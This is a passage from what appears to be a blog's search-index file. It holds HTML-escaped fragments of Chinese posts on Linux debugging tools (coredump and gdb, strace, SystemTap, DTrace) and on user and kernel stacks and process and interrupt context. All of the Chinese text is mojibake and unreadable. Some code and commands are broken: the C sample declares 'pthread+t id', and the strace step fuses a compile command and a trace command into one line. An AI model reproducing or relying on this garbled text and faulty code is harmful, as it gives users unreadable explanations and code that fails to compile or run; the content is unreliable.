&lt;li&gt;coreåˆç§°ä¸ºcoredumpæ–‡ä»¶ï¼Œæ˜¯Unix/Linuxæ“ä½œç³»ç»Ÿçš„ä¸€ç§æœºåˆ¶ï¼Œå¯¹äºçº¿ä¸ŠæœåŠ¡æ¥è¯´ï¼Œå‡ºcoreçš„è¿‡ç¨‹æ„å‘³ç€æœåŠ¡æš‚æ—¶ä¸èƒ½å“åº”ï¼Œéœ€è¦æ¢å¤ï¼Œå¹¶ä¸”éšç€Coreè¿›ç¨‹çš„å†…å­˜ç©ºé—´è¶Šå¤§ï¼Œæ­¤è¿‡ç¨‹å¯èƒ½æŒç»­å¾ˆé•¿ä¸€æ®µæ—¶é—´&lt;/li&gt;
&lt;li&gt;å‡¡äº‹çš†æœ‰ä¸¤é¢æ€§ï¼Œæ“ä½œç³»ç»Ÿåœ¨coredumpæ—¶ï¼Œè™½ç„¶ä¼šç»ˆæ­¢å½“å‰è¿›ç¨‹ï¼Œä½†æ˜¯ä¹Ÿä¼šä¿ç•™ä¸‹ç¬¬ä¸€æ‰‹çš„ç°åœºæ•°æ®ï¼Œæ“ä½œç³»ç»Ÿä»¿ä½›æ˜¯ä¸€æ¶æŒ‰ä¸‹å¿«é—¨çš„ç›¸æœºï¼Œç…§ç‰‡å°±æ˜¯ç”Ÿæˆçš„coredump&lt;/li&gt;
&lt;li&gt;coredumpæ–‡ä»¶åŒ…å«å½“è¿›ç¨‹è¢«ç»ˆæ­¢æ—¶å†…å­˜ã€CPUå¯„å­˜å™¨å’Œå„ç§å‡½æ•°è°ƒç”¨å †æ ˆä¿¡æ¯ç­‰ï¼Œä»¥ä¾›ååºå¼€å‘äººå‘˜è°ƒè¯•&lt;/li&gt;
&lt;li&gt;coredumpå­˜å‚¨è·¯å¾„
&lt;ul&gt;
&lt;li&gt;æ‰§è¡Œå‘½ä»¤å¯ä»¥çœ‹åˆ°coreæ–‡ä»¶å­˜åœ¨ä½ç½®&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;coredumpäº§ç”Ÿæ¡ä»¶&lt;/li&gt;
&lt;li&gt;coredumpäº§ç”ŸåŸå› &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;gdbå®šä½coredumpæ–‡ä»¶&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç¤ºä¾‹ä»£ç &lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å‘½ä»¤ç¼–è¯‘ä»£ç å¹¶æ‰§è¡Œ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;strace&#34;&gt;strace&lt;/h3&gt;
&lt;p&gt;straceæ˜¯ä¸€ç§è°ƒè¯•å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥è·Ÿè¸ªç¨‹åºç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨Ubuntuä¸‹å¯ä»¥é€šè¿‡å‘½ä»¤apt install straceå®‰è£…&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¹Ÿå¯ä»¥ç”¨æ¥è·Ÿè¸ªä¿¡å·è°ƒç”¨ï¼Œä¸”å¯ç»Ÿè®¡ç³»ç»Ÿè°ƒç”¨ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ç¤ºä¾‹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å®ä¾‹ç¨‹åºï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include&amp;lt;iostream&amp;gt;
using namespace std;
int main()
{
    cout&amp;lt;&amp;lt;&amp;quot;Hello World!&amp;quot;&amp;lt;&amp;lt;endl;
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿½è¸ªç³»ç»Ÿè°ƒç”¨&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;g++ test.cpp -o teststrace ./test
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå›¾&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627828827577.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627829057506.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç»“æœåˆ†æ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ¯ä¸€è¡Œéƒ½æ˜¯ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼Œç­‰å·å·¦è¾¹æ˜¯ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°åå’Œå‚æ•°ï¼Œå³è¾¹æ˜¯è¯¥è°ƒç”¨çš„è¿”å›å€¼&lt;/li&gt;
&lt;li&gt;ä»ä¸Šé¢ç»“æœå›¾ï¼Œç³»ç»Ÿé¦–å…ˆè°ƒç”¨execveï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œæ¥ç€æ˜¯ä¸€äº›ç¯å¢ƒåˆå§‹åŒ–ï¼Œç„¶ååœ¨æœ€åå€’æ•°ç¬¬4è¡Œï¼Œè°ƒç”¨writeå‡½æ•°å°†å­—ç¬¦ä¸²è¾“å‡ºåˆ°å±å¹•ï¼Œæœ€åè°ƒç”¨exit_groupé€€å‡ºè¿›ç¨‹&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ä½¿ç”¨straceåšä¿¡å·è¿½è¸ª&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;straceåœ¨è¿è¡Œç¨‹åºæ—¶ï¼Œå¦‚æœç¨‹åºè¢«ä¼ é€’äº†ä»»ä½•ä¿¡å·æ˜¯å¯ä»¥ç›‘è§†åˆ°çš„&lt;/li&gt;
&lt;li&gt;ç»Ÿè®¡ç³»ç»Ÿè°ƒç”¨
&lt;ul&gt;
&lt;li&gt;é€šè¿‡ä½¿ç”¨ -c å‚æ•°ï¼Œå¯ä»¥å°†è¿›ç¨‹çš„æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨åšä¸€ä¸ªç»Ÿè®¡åˆ†æå¹¶æ˜¾ç¤º&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1627828952384.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;systemtap&#34;&gt;SystemTap&lt;/h3&gt;
&lt;p&gt;SystemTapåŸºäºkprobeçš„å®ç°ï¼Œå¯ç›‘æ§å†…æ ¸å’Œç”¨æˆ·ç¨‹åºã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç¤ºä¾‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç›‘æ§è¿è¡Œä¸­ç¨‹åºæŒ‡å®šå‡½æ•°çš„è°ƒç”¨å‚æ•°å€¼ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;pthread.h&amp;gt;

void print(char *p){
    printf(&amp;quot;%s.\n&amp;quot;, p);
}

void* test_fn(void* arg){
    while(1){
        print(&amp;quot;hello&amp;quot;);
        sleep(5);
    }
    return ((void *)0);
}

int main(int argc, char **argv){
    pthread+t id;
    int ret;
    ret = pthread_create(&amp;amp;id, NULL, test_fn, NULL);
    if(ret != 0){
        printf(&amp;quot;create! \n&amp;quot;);
        exit(1);
    }
    printf(&amp;quot;int main process.\n&amp;quot;);
    pthread_join(id, NULL);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»¥ä¸Šç¨‹åºæ²¡5ç§’ä¼šè°ƒç”¨ä¸€æ¬¡printï¼Œæˆ‘æƒ³çŸ¥é“printçš„è¾“å…¥å‚æ•°æ˜¯ä»€ä¹ˆï¼Œé‚£ä¹ˆç¼–å†™SystemTapè„šæœ¬ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function myprint: string (val)
%{
    char *str = (char *) STAP_ARG_val;
    snprintf(STAP_RETVALUE, MAXSTRINGLEN, &amp;quot;%s&amp;quot;, str);
%}
probe process(3266).function(&amp;quot;print&amp;quot;) {printf(&amp;quot;%s\n&amp;quot;, myprint($p));}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;stap -g test.stp&lt;/p&gt;
&lt;p&gt;è¿™æ ·å°±å¯ä»¥è·å¾—ç›‘æ§çš„ç»“æœäº†ï¼Œå› ä¸ºç”¨åˆ°äº†å†…åµŒCæ¥è·å–å­—ç¬¦ä¸²çš„å€¼ï¼Œæ‰€ä»¥å°±éœ€è¦åŠ ä¸Š-gå‚æ•°ã€‚&lt;/p&gt;
&lt;h3 id=&#34;dtrace&#34;&gt;DTrace&lt;/h3&gt;
&lt;p&gt;Dtraceå¯ä»¥ç›‘æ§ç”¨æˆ·æ€çš„ç¨‹åºã€‚&lt;/p&gt;
">ã€linuxã€‘å‡ ç§è¿›ç¨‹ç›‘æ§å·¥å…·</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-jin-cheng-zhong-duan-shang-xia-wen/"" data-c="
          &lt;h2 id=&#34;å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´&#34;&gt;å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1630477308043.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;ç”¨æˆ·æ€å’Œå†…æ ¸æ€&#34;&gt;ç”¨æˆ·æ€å’Œå†…æ ¸æ€&lt;/h3&gt;
&lt;p&gt;å½“è¿›ç¨‹åœ¨æ‰§è¡Œç”¨æˆ·&lt;strong&gt;è‡ªå·±çš„ä»£ç &lt;/strong&gt;æ—¶ï¼Œåˆ™ç§°å…¶å¤„äºç”¨æˆ·è¿è¡Œæ€ï¼Œå³æ­¤æ—¶å¤„ç†å™¨åœ¨ç‰¹æƒçº§æœ€ä½çš„ï¼ˆ3çº§ï¼‰ç”¨æˆ·ä»£ç ä¸­è¿è¡Œã€‚å½“ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œç³»ç»Ÿè°ƒç”¨è€Œé™·å…¥å†…æ ¸æ€æ‰§è¡Œæ—¶ï¼Œå°±ç§°ä¸ºè¿›ç¨‹å¤„äºå†…æ ¸æ€ï¼Œæ­¤æ—¶å¤„ç†å™¨å¤„äºç‰¹æƒçº§è¾ƒé«˜çš„(0çº§)å†…æ ¸ä»£ç ä¸­æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;å½“æ­£åœ¨æ‰§è¡Œç”¨æˆ·ç¨‹åºè€Œçªç„¶è¢«ä¸­æ–­ç¨‹åºä¸­æ–­æ—¶ï¼Œæ­¤æ—¶ç”¨æˆ·ç¨‹åºä¹Ÿå¯ä»¥è±¡å¾æ€§åœ°ç§°ä¸ºå¤„äºè¿›ç¨‹çš„å†…æ ¸æ€ã€‚å› ä¸ºä¸­æ–­å¤„ç†ç¨‹åºå°†ä½¿ç”¨å½“å‰è¿›ç¨‹çš„å†…æ ¸æ ˆã€‚è¿™ä¸å¤„äºå†…æ ¸æ€çš„è¿›ç¨‹çš„çŠ¶æ€æœ‰äº›ç±»ä¼¼ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ç”¨æˆ·æ ˆå’Œå†…æ ¸æ ˆ&#34;&gt;ç”¨æˆ·æ ˆå’Œå†…æ ¸æ ˆ&lt;/h3&gt;
&lt;p&gt;åœ¨ä¸€ä¸ªè¿›ç¨‹è¢«åˆ›å»ºæ—¶ï¼Œä¼šåˆ›å»ºè¿›ç¨‹æ§åˆ¶å—å’Œè¿›ç¨‹å †æ ˆï¼Œ&lt;strong&gt;æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ç”¨æˆ·æ ˆå’Œå†…æ ¸æ ˆ&lt;/strong&gt;ã€‚ç”¨æˆ·æ ˆä¿å­˜åœ¨ç”¨æˆ·åœ°å€ç©ºé—´ï¼Œå†…æ ¸æ ˆä¿å­˜åœ¨å†…æ ¸åœ°å€ç©ºé—´ã€‚&lt;/p&gt;
&lt;p&gt;CPUå †æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œè¿›ç¨‹åœ¨ç”¨æˆ·æ€æ—¶ï¼ŒæŒ‡å‘ç”¨æˆ·å †æ ˆåœ°å€ï¼›è¿›ç¨‹åœ¨å†…æ ¸æ€æ—¶ï¼ŒæŒ‡å‘å†…æ ¸å †æ ˆåœ°å€ã€‚å³ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1630482357569.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å½“ä»ç”¨æˆ·æ ˆåˆ‡æ¢åˆ°å†…æ ¸æ ˆæ—¶ï¼Œéœ€è¦ç»å†ä¸¤ä¸ªæ­¥éª¤ï¼Œé¦–å…ˆæ˜¯å°†ç”¨æˆ·å †æ ˆåœ°å€ä¿å­˜åˆ°å†…æ ¸å †æ ˆä¸­ï¼Œç„¶åå°†CPUå †æ ˆå¯„å­˜å™¨æŒ‡å‘å†…æ ¸å †æ ˆï¼›å½“ä»å†…æ ¸æ ˆåˆ‡æ¢åˆ°ç”¨æˆ·æ ˆæ—¶ï¼Œéœ€è¦å°†å†…æ ¸å †æ ˆä¸­ä¿å­˜çš„ç”¨æˆ·å †æ ˆåœ°å€æ¢å¤åˆ°CPUå †æ ˆå¯„å­˜å™¨ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆï¼ŒçŸ¥é“ä»å†…æ ¸è½¬åˆ°ç”¨æˆ·æ€æ—¶ï¼Œç”¨æˆ·æ ˆçš„åœ°å€æ˜¯åœ¨é™·å…¥å†…æ ¸çš„æ—¶å€™ä¿å­˜åœ¨å†…æ ¸æ ˆé‡Œé¢çš„ï¼Œä½†æ˜¯åœ¨é™·å…¥å†…æ ¸çš„æ—¶å€™ï¼Œå¦‚ä½•çŸ¥é“å†…æ ¸æ ˆçš„åœ°å€ï¼Ÿå…³é”®åœ¨è¿›ç¨‹ä»ç”¨æˆ·æ€è½¬åˆ°å†…æ ¸æ€çš„æ—¶å€™ï¼Œè¿›ç¨‹çš„å†…æ ¸æ ˆæ€»æ˜¯ç©ºçš„ã€‚è¿™æ˜¯å› ä¸ºå½“è¿›ç¨‹åœ¨ç”¨æˆ·æ€è¿è¡Œæ—¶ï¼Œä½¿ç”¨çš„ç”¨æˆ·æ ˆï¼Œå½“è¿›ç¨‹é™·å…¥åˆ°å†…æ ¸æ€æ—¶ï¼Œå†…æ ¸ä¿å­˜è¿›ç¨‹åœ¨å†…æ ¸æ€è¿è¡Œçš„ç›¸å…³ä¿¡æ¯ï¼Œä½†æ˜¯ä¸€æ—¦è¿›ç¨‹è¿”å›åˆ°ç”¨æˆ·æ€åï¼Œå†…æ ¸æ ˆä¸­ä¿å­˜çš„ä¿¡æ¯æ— æ•ˆï¼Œä¼šå…¨éƒ¨æ¢å¤ï¼Œå› æ­¤æ¯æ¬¡è¿›ç¨‹ä»ç”¨æˆ·æ€é™·å…¥å†…æ ¸çš„æ—¶å€™å¾—åˆ°çš„å†…æ ¸æ ˆéƒ½æ˜¯ç©ºçš„ã€‚æ‰€ä»¥åœ¨è¿›ç¨‹é™·å…¥å†…æ ¸çš„æ—¶å€™ï¼Œç›´æ¥æŠŠå†…æ ¸æ ˆçš„æ ˆé¡¶åœ°å€ç»™å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨å°±å¯ä»¥äº†&lt;/p&gt;
&lt;p&gt;ç®€è€Œè¨€ä¹‹,ä¸€ä¸ªç¨‹åºè‡³å°‘æœ‰ä¸€ä¸ªè¿›ç¨‹,ä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹. çº¿ç¨‹çš„åˆ’åˆ†å°ºåº¦å°äºè¿›ç¨‹ï¼Œä½¿å¾—å¤šçº¿ç¨‹ç¨‹åºçš„å¹¶å‘æ€§é«˜ã€‚&lt;br&gt;
å¦å¤–ï¼Œè¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ‹¥æœ‰ç‹¬ç«‹çš„å†…å­˜å•å…ƒï¼Œè€Œå¤šä¸ªçº¿ç¨‹å…±äº«å†…å­˜ï¼Œä»è€Œæå¤§åœ°æé«˜äº†ç¨‹åºçš„è¿è¡Œæ•ˆç‡ã€‚&lt;br&gt;
åŒä¸€ä¸ªè¿›ç¨‹çš„å¤šä¸ªå­çº¿ç¨‹åœ¨è¿›ç¨‹çš„å…±äº«å†…å­˜ä¸­åˆ†é…ç‹¬ç«‹çš„æ ˆç©ºé—´&lt;br&gt;
æ ˆï¼šæ˜¯ä¸ªçº¿ç¨‹ç‹¬æœ‰çš„ï¼Œä¿å­˜å…¶è¿è¡ŒçŠ¶æ€å’Œå±€éƒ¨è‡ªåŠ¨å˜é‡çš„ã€‚æ ˆåœ¨çº¿ç¨‹å¼€å§‹çš„æ—¶å€™åˆå§‹åŒ–ï¼Œæ¯ä¸ªçº¿ç¨‹çš„æ ˆäº’ç›¸ç‹¬ç«‹ï¼Œå› æ­¤ï¼Œæ ˆæ˜¯thread safeçš„ã€‚æ¯ä¸ªC++å¯¹è±¡çš„æ•°æ®æˆå‘˜ä¹Ÿå­˜åœ¨åœ¨æ ˆä¸­ï¼Œæ¯ä¸ªå‡½æ•°éƒ½æœ‰è‡ªå·±çš„æ ˆï¼Œæ ˆè¢«ç”¨æ¥åœ¨å‡½æ•°ä¹‹é—´ä¼ é€’å‚æ•°ã€‚æ“ä½œç³»ç»Ÿåœ¨åˆ‡æ¢çº¿ç¨‹çš„æ—¶å€™ä¼šè‡ªåŠ¨çš„åˆ‡æ¢æ ˆï¼Œå°±æ˜¯åˆ‡æ¢SS/ESPå¯„å­˜å™¨ã€‚æ ˆç©ºé—´ä¸éœ€è¦åœ¨é«˜çº§è¯­è¨€é‡Œé¢æ˜¾å¼çš„åˆ†é…å’Œé‡Šæ”¾ã€‚&lt;br&gt;
åœ¨Linuxç³»ç»Ÿä¸Šæ¯ä¸€ä¸ªçº¿ç¨‹ï¼Œå®é™…ä¸Šéƒ½æœ‰ç‹¬ç«‹çš„2ä¸ªæ ˆç©ºé—´ï¼Œç”¨æˆ·æ ˆç©ºé—´å’Œå†…æ ¸æ ˆç©ºé—´ã€‚ï¼ˆæ³¨æ„æ˜¯æ¯ä¸ªçº¿ç¨‹ï¼‰&lt;br&gt;
è¿›ç¨‹å’Œçº¿ç¨‹åœ¨Linuxä¸Šçš„å”¯ä¸€åŒºåˆ«å°±æ˜¯åŒä¸€ä¸ªè¿›ç¨‹çš„ä¸åŒçº¿ç¨‹å…±äº«è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œä»…æ­¤è€Œå·²ã€‚&lt;/p&gt;
&lt;h2 id=&#34;è¿›ç¨‹ä¸­æ–­ä¸Šä¸‹æ–‡&#34;&gt;è¿›ç¨‹/ä¸­æ–­ä¸Šä¸‹æ–‡&lt;/h2&gt;
&lt;h3 id=&#34;è¿›ç¨‹ä¸Šä¸‹æ–‡&#34;&gt;è¿›ç¨‹ä¸Šä¸‹æ–‡&lt;/h3&gt;
&lt;p&gt;å½“ä¸€ä¸ªè¿›ç¨‹åœ¨æ‰§è¡Œæ—¶ï¼Œ&lt;strong&gt;CPUçš„æ‰€æœ‰å¯„å­˜å™¨ä¸­çš„å€¼ã€è¿›ç¨‹çš„çŠ¶æ€ä»¥åŠå †æ ˆä¸­çš„å†…å®¹è¢«ç§°ä¸ºè¯¥è¿›ç¨‹çš„ä¸Šä¸‹æ–‡&lt;/strong&gt;ã€‚å½“å†…æ ¸éœ€è¦åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹æ—¶ï¼Œå®ƒéœ€è¦ä¿å­˜å½“å‰è¿›ç¨‹çš„æ‰€æœ‰çŠ¶æ€ï¼Œå³ä¿å­˜å½“å‰è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œä»¥ä¾¿åœ¨å†æ¬¡æ‰§è¡Œè¯¥è¿›ç¨‹æ—¶ï¼Œèƒ½å¤Ÿå¿…å¾—åˆ°åˆ‡æ¢æ—¶çš„çŠ¶æ€æ‰§è¡Œä¸‹å»ã€‚åœ¨LINUXä¸­ï¼Œå½“å‰è¿›ç¨‹ä¸Šä¸‹æ–‡å‡ä¿å­˜åœ¨è¿›ç¨‹çš„ä»»åŠ¡æ•°æ®ç»“æ„ä¸­ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¸­æ–­ä¸Šä¸‹æ–‡&#34;&gt;ä¸­æ–­ä¸Šä¸‹æ–‡&lt;/h3&gt;
&lt;p&gt;åœ¨å‘ç”Ÿä¸­æ–­æ—¶,å†…æ ¸å°±åœ¨è¢«ä¸­æ–­è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œåœ¨å†…æ ¸æ€ä¸‹æ‰§è¡Œä¸­æ–­æœåŠ¡ä¾‹ç¨‹ã€‚ä½†åŒæ—¶ä¼šä¿ç•™æ‰€æœ‰éœ€è¦ç”¨åˆ°çš„èµ„æºï¼Œä»¥ä¾¿ä¸­æ–­æœåŠ¡ç»“æŸæ—¶èƒ½æ¢å¤è¢«ä¸­æ–­è¿›ç¨‹çš„æ‰§è¡Œã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¸Šä¸‹æ–‡åˆ‡æ¢&#34;&gt;ä¸Šä¸‹æ–‡åˆ‡æ¢&lt;/h3&gt;
&lt;p&gt;æ­£æ˜¯æœ‰äº†ä¸åŒè¿è¡ŒçŠ¶æ€çš„åˆ’åˆ†ï¼Œæ‰æœ‰äº†ä¸Šä¸‹æ–‡çš„æ¦‚å¿µã€‚ç”¨æˆ·ç©ºé—´çš„åº”ç”¨ç¨‹åºï¼Œå¦‚æœæƒ³è¦è¯·æ±‚ç³»ç»ŸæœåŠ¡ï¼Œæ¯”å¦‚æ“ä½œä¸€ä¸ªç‰©ç†è®¾å¤‡ï¼Œæˆ–è€…æ˜ å°„ä¸€æ®µè®¾å¤‡ç©ºé—´çš„åœ°å€åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå°±å¿…é¡»é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥ï¼ˆæ“ä½œç³»ç»Ÿæä¾›ç»™ç”¨æˆ·ç©ºé—´çš„æ¥å£å‡½æ•°ï¼‰å®ç°ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627826877794.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;é€šè¿‡ç³»ç»Ÿè°ƒç”¨ï¼Œç”¨æˆ·ç©ºé—´çš„åº”ç”¨ç¨‹åºå°±ä¼šè¿›å…¥å†…æ ¸ç©ºé—´ï¼Œç”±å†…æ ¸ä»£è¡¨è¯¥è¿›ç¨‹è¿è¡Œäºå†…æ ¸ç©ºé—´ï¼Œè¿™å°±æ¶‰åŠåˆ°ä¸Šä¸‹æ–‡çš„åˆ‡æ¢ï¼Œç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´å…·æœ‰ä¸åŒçš„åœ°å€æ˜ å°„ï¼Œé€šç”¨æˆ–ä¸“ç”¨çš„å¯„å­˜å™¨ç»„ï¼Œè€Œç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹è¦ä¼ é€’å¾ˆå¤šå˜é‡ã€å‚æ•°ç»™å†…æ ¸ï¼Œå†…æ ¸ä¹Ÿè¦ä¿å­˜ç”¨æˆ·è¿›ç¨‹çš„ä¸€äº›å¯„å­˜å™¨ã€å˜é‡ç­‰ï¼Œä»¥ä¾¿ç³»ç»Ÿè°ƒç”¨ç»“æŸåå›åˆ°ç”¨æˆ·ç©ºé—´ç»§ç»­æ‰§è¡Œï¼Œæ‰€è°“çš„è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œå°±æ˜¯ä¸€ä¸ªè¿›ç¨‹åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼ŒCPUçš„æ‰€æœ‰å¯„å­˜å™¨ä¸­çš„å€¼ã€è¿›ç¨‹çš„çŠ¶æ€ä»¥åŠå †æ ˆä¸­çš„å†…å®¹ï¼Œå½“å†…æ ¸éœ€è¦åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹æ—¶ï¼Œå®ƒéœ€è¦ä¿å­˜å½“å‰è¿›ç¨‹çš„æ‰€æœ‰çŠ¶æ€ï¼Œå³ä¿å­˜å½“å‰è¿›ç¨‹çš„è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œä»¥ä¾¿å†æ¬¡æ‰§è¡Œè¯¥è¿›ç¨‹æ—¶ï¼Œèƒ½å¤Ÿæ¢å¤åˆ‡æ¢æ—¶çš„çŠ¶æ€ï¼Œç»§ç»­æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;åŒç†ï¼Œç¡¬ä»¶é€šè¿‡è§¦å‘ä¿¡å·ï¼Œå¯¼è‡´å†…æ ¸è°ƒç”¨ä¸­æ–­å¤„ç†ç¨‹åºï¼Œè¿›å…¥å†…æ ¸ç©ºé—´ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œç¡¬ä»¶çš„ä¸€äº›å˜é‡å’Œå‚æ•°ä¹Ÿè¦ä¼ é€’ç»™å†…æ ¸ï¼Œå†…æ ¸é€šè¿‡è¿™äº›å‚æ•°è¿›è¡Œä¸­æ–­å¤„ç†ï¼Œä¸­æ–­ä¸Šä¸‹æ–‡å°±å¯ä»¥ç†è§£ä¸ºç¡¬ä»¶ä¼ é€’è¿‡æ¥çš„è¿™äº›å‚æ•°å’Œå†…æ ¸éœ€è¦ä¿å­˜çš„ä¸€äº›ç¯å¢ƒï¼Œä¸»è¦æ˜¯è¢«ä¸­æ–­çš„è¿›ç¨‹çš„ç¯å¢ƒã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Linuxå†…æ ¸å·¥ä½œåœ¨è¿›ç¨‹ä¸Šä¸‹æ–‡æˆ–è€…ä¸­æ–­ä¸Šä¸‹æ–‡ã€‚&lt;/strong&gt; æä¾›ç³»ç»Ÿè°ƒç”¨æœåŠ¡çš„å†…æ ¸ä»£ç ä»£è¡¨å‘èµ·ç³»ç»Ÿè°ƒç”¨çš„åº”ç”¨ç¨‹åºè¿è¡Œåœ¨è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼›å¦ä¸€æ–¹é¢ï¼Œä¸­æ–­å¤„ç†ç¨‹åºï¼Œå¼‚æ­¥è¿è¡Œåœ¨ä¸­æ–­ä¸Šä¸‹æ–‡ã€‚ä¸­æ–­ä¸Šä¸‹æ–‡å’Œç‰¹å®šè¿›ç¨‹æ— å…³ã€‚&lt;/p&gt;
&lt;p&gt;è¿è¡Œåœ¨è¿›ç¨‹ä¸Šä¸‹æ–‡çš„å†…æ ¸ä»£ç æ˜¯å¯ä»¥è¢«æŠ¢å çš„ï¼ˆLinux2.6æ”¯æŒæŠ¢å ï¼‰ã€‚ä½†æ˜¯ä¸€ä¸ªä¸­æ–­ä¸Šä¸‹æ–‡ï¼Œé€šå¸¸éƒ½ä¼šå§‹ç»ˆå æœ‰CPUï¼ˆå½“ç„¶ä¸­æ–­å¯ä»¥åµŒå¥—ï¼Œä½†æˆ‘ä»¬ä¸€èˆ¬ä¸è¿™æ ·åšï¼‰ï¼Œä¸å¯ä»¥è¢«æ‰“æ–­ã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œè¿è¡Œåœ¨ä¸­æ–­ä¸Šä¸‹æ–‡çš„ä»£ç å°±è¦å—ä¸€äº›é™åˆ¶ï¼Œä¸èƒ½åšä¸‹é¢çš„äº‹æƒ…ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç¡çœ æˆ–è€…æ”¾å¼ƒCPUã€‚  è¿™æ ·åšçš„åæœæ˜¯ç¾éš¾æ€§çš„ï¼Œå› ä¸ºå†…æ ¸åœ¨è¿›å…¥ä¸­æ–­ä¹‹å‰ä¼šå…³é—­è¿›ç¨‹è°ƒåº¦ï¼Œä¸€æ—¦ç¡çœ æˆ–è€…æ”¾å¼ƒCPUï¼Œè¿™æ—¶å†…æ ¸æ— æ³•è°ƒåº¦åˆ«çš„è¿›ç¨‹æ¥æ‰§è¡Œï¼Œç³»ç»Ÿå°±ä¼šæ­»æ‰&lt;/li&gt;
